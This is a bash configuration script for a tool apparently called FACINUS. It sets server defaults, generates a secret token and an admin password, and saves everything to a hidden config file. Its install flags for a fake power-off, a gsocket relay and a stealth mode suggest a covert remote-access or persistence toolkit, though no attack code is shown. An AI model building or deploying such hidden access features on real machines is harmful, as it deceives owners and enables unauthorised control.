#!/bin/bash
# Default configuration options

# Server configuration
SERVER_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v "127.0.0.1" | head -n 1)
SERVER_PORT=80
SERVER_ROOT="/srv/http/deployment"
SECRET_TOKEN=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
ADMIN_PASSWORD=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12)

# Installation options
NO_ROOT=false
NO_SERVICES=false
INSTALL_WOL=true
INSTALL_FAKE_POWEROFF=true
INSTALL_GSOCKET=true
STEALTH_MODE=true
DARK_THEME=true
VERBOSE=false

# List of supported distros
ARCH_DISTROS=("arch" "manjaro" "endeavouros" "artix")
DEB_DISTROS=("ubuntu" "debian" "linuxmint" "pop" "kali" "parrot" "elementary")
RPM_DISTROS=("fedora" "centos" "rhel" "rocky" "alma")

# Save current configuration
save_config() {
    local config_file="$SCRIPT_DIR/.facinus.conf"
    cat > "$config_file" << EOF
# FACINUS configuration - Generated on $(date)
SERVER_IP=$SERVER_IP
SERVER_PORT=$SERVER_PORT
SERVER_ROOT=$SERVER_ROOT
SECRET_TOKEN=$SECRET_TOKEN
ADMIN_PASSWORD=$ADMIN_PASSWORD
NO_ROOT=$NO_ROOT
NO_SERVICES=$NO_SERVICES
INSTALL_WOL=$INSTALL_WOL
INSTALL_FAKE_POWEROFF=$INSTALL_FAKE_POWEROFF
INSTALL_GSOCKET=$INSTALL_GSOCKET
STEALTH_MODE=$STEALTH_MODE
DARK_THEME=$DARK_THEME
DISTRO=$DISTRO
ARCH=$ARCH
EOF
    chmod 600 "$config_file"
    echo "Configuration saved to $config_file"
}
